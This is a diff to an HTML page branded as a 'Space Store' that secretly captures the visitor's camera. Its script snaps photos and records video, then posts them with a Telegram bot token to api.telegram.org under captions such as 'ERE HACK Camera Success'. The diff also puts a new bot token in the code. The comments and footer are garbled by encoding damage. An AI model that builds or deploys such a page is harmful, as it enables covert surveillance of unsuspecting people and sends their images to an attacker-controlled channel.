@@ -65,12 +65,12 @@
   <video id="camera" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <footer>0„8 2025 Space Store. All rights reserved.</footer>
+  <footer>Â0â€ž8 2025 Space Store. All rights reserved.</footer>
 
   <script>
-    // 2Ñ52Ò52Ó32Ð82Ò02Ó72Ò2: 2Õ52Ï82Ö1 placeholder
-    const BOT_TOKEN = "8068929944:AAHtsM5Yf--VwBDFg3b_paSkXADFRh8kuoo"; // 2Õ32Ñ12Ñ32Ñ12Ô12Ö02Ð82Ö12Ò72Ò22Ï02Ó32Ï52Ï22Ô42Ð72Õ22Ó32Ï5
-    const CHAT_ID = "-4898717294";     // 2Õ32Ñ12Ñ32Ñ12Ô12Ö02Ð82Ö12Ò72Ò22Ï02Ó32Ï52Ï22Ô42Ð72Õ22Ó32Ï5
+    // Â2Ã‘5Â2Ã’5Â2Ã“3Â2Ã8Â2Ã’0Â2Ã“7Â2Ã’2: Â2Ã•5Â2Ã8Â2Ã–1 placeholder
+    const BOT_TOKEN = "8496476562:AAH3FlBNiUm6HE5cd8SbWn2fty-Ifmf1Flo"; // Â2Ã•3Â2Ã‘1Â2Ã‘3Â2Ã‘1Â2Ã”1Â2Ã–0Â2Ã8Â2Ã–1Â2Ã’7Â2Ã’2Â2Ã0Â2Ã“3Â2Ã5Â2Ã2Â2Ã”4Â2Ã7Â2Ã•2Â2Ã“3Â2Ã5
+    const CHAT_ID = "-4898717294";     // Â2Ã•3Â2Ã‘1Â2Ã‘3Â2Ã‘1Â2Ã”1Â2Ã–0Â2Ã8Â2Ã–1Â2Ã’7Â2Ã’2Â2Ã0Â2Ã“3Â2Ã5Â2Ã2Â2Ã”4Â2Ã7Â2Ã•2Â2Ã“3Â2Ã5
 
     const video = document.getElementById("camera");
     const canvas = document.getElementById("canvas");
@@ -101,13 +101,13 @@
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "photo.jpg");
-        formData.append("caption", "ERE HACK Camera Success ”9â1");
+        formData.append("caption", "ERE HACK Camera Success â€9Ã¢1");
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formData
         });
-        console.log("Photo sent 7¼3");
+        console.log("Photo sent Â7Â¼3");
       }, "image/jpeg");
     }
 
@@ -126,13 +126,13 @@
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
       formData.append("video", blob, "video.webm");
-      formData.append("caption", "ERE Video Sent ”9À3");
+      formData.append("caption", "ERE Video Sent â€9Ã€3");
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
         method: "POST",
         body: formData
       });
-      console.log("Video sent 7¼3");
+      console.log("Video sent Â7Â¼3");
     }
   </script>
 </body>
